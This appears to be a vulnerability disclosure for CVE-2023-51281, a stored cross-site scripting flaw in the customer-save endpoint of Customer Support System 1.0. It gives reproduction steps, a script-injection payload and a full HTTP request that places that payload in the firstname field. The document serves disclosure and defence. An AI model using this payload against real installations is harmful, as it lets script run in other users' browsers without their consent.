# CVE-2023-51281
# Customer Support System 1.0 - Multiple Cross-Site Scripting (XSS) Vulnerability in “firstname”, "lastname", "middlename", "contact" or “address” parameters

**Description**: Multiple cross-site scripting (XSS) vulnerabilities in /customer_support/ajax.php?action=save_customer in Customer Support System 1.0 allow authenticated attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the “firstname”, "lastname", "middlename", "contact" or “address” parameters.

**Vulnerable Product Version**: Customer Support System 1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 28/11/2023  
**Confirmed on**: 22/12/2023  
**CVE**: CVE-2023-51281  
**Tested on**: Windows  
### Steps to reproduce:  
1. Log in to the application.  
2. Navigate to "/customer_support/index.php?page=customer_list" to edit an existing customer or "/customer_support/index.php?page=new_customer" to create a new customer.  
3. In the customer edit pages, insert a carefully crafted payload into firstname, lastname, middlename, contact, or address parameters.  
4. Payload: ```</dt></b><script>alert(document.domain)</script>```  
### Resquest:  
```
POST /customer_support/ajax.php?action=save_customer HTTP/1.1
Host: 192.168.68.148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------212391604122778812451614149575
Content-Length: 1149
Origin: http://192.168.68.148
Connection: close
Referer: http://192.168.68.148/customer_support/index.php?page=new_customer
Cookie: csrftoken=1hWW6JE5vLFhJv2y8LwgL3WNPbPJ3J2WAX9F2U0Fd5H5t6DSztkJWD4nWFrbF8ko; sessionid=xrn1sshbol1vipddxsijmgkdp2q4qdgq; PHPSESSID=abige9ar0b1bi3qcf9mkv258o3

-----------------------------212391604122778812451614149575
Content-Disposition: form-data; name="id"


-----------------------------212391604122778812451614149575
Content-Disposition: form-data; name="firstname"

teste</dt></b><script>alert(document.domain)</script>
-----------------------------212391604122778812451614149575
Content-Disposition: form-data; name="middlename"


-----------------------------212391604122778812451614149575
Content-Disposition: form-data; name="lastname"

xss
-----------------------------212391604122778812451614149575
Content-Disposition: form-data; name="contact"

210
-----------------------------212391604122778812451614149575
Content-Disposition: form-data; name="address"

asdasd
-----------------------------212391604122778812451614149575
Content-Disposition: form-data; name="email"

teste@teste.com
-----------------------------212391604122778812451614149575
Content-Disposition: form-data; name="password"

xss
-----------------------------212391604122778812451614149575
Content-Disposition: form-data; name="cpass"

xss
-----------------------------212391604122778812451614149575--
```     
Discoverer(s)/Credits:  
Geraldo Alcântara
